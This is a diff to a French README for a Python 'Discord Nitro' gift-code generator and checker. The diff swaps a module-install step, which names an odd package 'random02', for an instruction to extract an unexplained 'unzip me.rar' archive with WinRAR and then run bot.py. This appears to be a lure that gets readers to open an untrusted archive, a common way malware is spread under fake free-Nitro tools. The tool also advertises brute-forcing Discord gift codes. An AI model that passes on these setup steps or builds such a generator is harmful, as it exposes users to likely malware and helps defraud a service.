@@ -1,4 +1,4 @@
-# Discord Gen Nitro
+# Discord Nitro
 
 Copyright (c) 2022 Zerow
 L'autorisation est accordée, gratuitement, à toute personne obtenant une copie de ce logiciel et des fichiers de documentation associés (le "Logiciel"), de traiter le Logiciel sans restriction, y compris, sans limitation, les droits d'utilisation, de copie, de modification, de fusion , publier, distribuer, sous-licencier et/ou vendre des copies du Logiciel, et permettre aux personnes à qui le Logiciel est fourni de le faire, sous réserve des conditions suivantes :
@@ -24,7 +24,7 @@ Il s'agit d'un générateur de code discord nitro et d'un vérificateur en pytho
 
 - Installer Python : https://www.python.org/downloads/release/python-370/
 - Installer VS Code : https://code.visualstudio.com
-- Installer les modules suivant : time / os / strings / requests / random02
+- Dézipper le ficher "unzip me.rar" avec l'outil winrar https://www.win-rar.com/postdownload.html?&L=10
 - Lancez bot.py et laissez le programme tourner.
 
 Vous pouvez à présent profiter de ce générateur nitro
